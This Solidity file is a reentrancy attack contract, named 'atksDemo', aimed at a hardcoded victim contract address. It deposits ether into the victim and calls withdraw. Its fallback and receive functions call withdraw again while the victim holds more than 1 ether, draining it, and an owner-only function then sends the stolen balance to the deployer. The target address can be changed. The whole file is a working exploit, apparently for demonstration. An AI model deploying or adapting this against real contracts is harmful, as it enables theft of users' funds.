//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract atksDemo{
    address public owner;
    address victim_addr = 0x2bbC386EdCAadC00B78d407f8ec975f329f383b0;
    uint256 _gas = 50000000;
    constructor(){
        owner = msg.sender;
    }
    modifier onlyOwner{
        require(msg.sender == owner, "bro wtf you can't withdraw");
        _;
    }


    function depositeInAttacker() public payable{
        
    }

    function depositeInVictim(uint256 _amount) public onlyOwner{

        bytes memory payload = abi.encodeWithSignature("deposit()");
        (bool success, ) = address(victim_addr).call{value:_amount}(payload);
        require(success);
    }

    function withdrawFromVictim() public payable onlyOwner{
        bytes memory payloads = abi.encodeWithSignature("withdraw(uint256)", _gas);
        (bool statecheck, ) = address(victim_addr).call(payloads);

    }


    fallback() external payable
    {
        if (victim_addr.balance > (1*(10**18))){
            // bytes memory payloads = abi.encodeWithSignature("withdraw(uint256)", _gas);
            (bool statecheck, ) = address(victim_addr).call(abi.encodeWithSignature("withdraw(uint256)", _gas));

        }
    }
    function checkContractBalance(address _add) public view returns(uint256) {
        return _add.balance;
    }

    receive() external payable {
        if (victim_addr.balance > (1*(10**18))){
            
            (bool statecheck, ) = address(victim_addr).call(abi.encodeWithSignature("withdraw(uint256)", _gas));

        }
    }

    function changeVictimAddress(address _newAddress) public onlyOwner {
        victim_addr = _newAddress;
    }
    function changegas(uint256 _newgas) public onlyOwner {
        _gas = _newgas;
    }


    function withdrawAll() onlyOwner public {
        payable(msg.sender).transfer(address(this).balance);
    }

}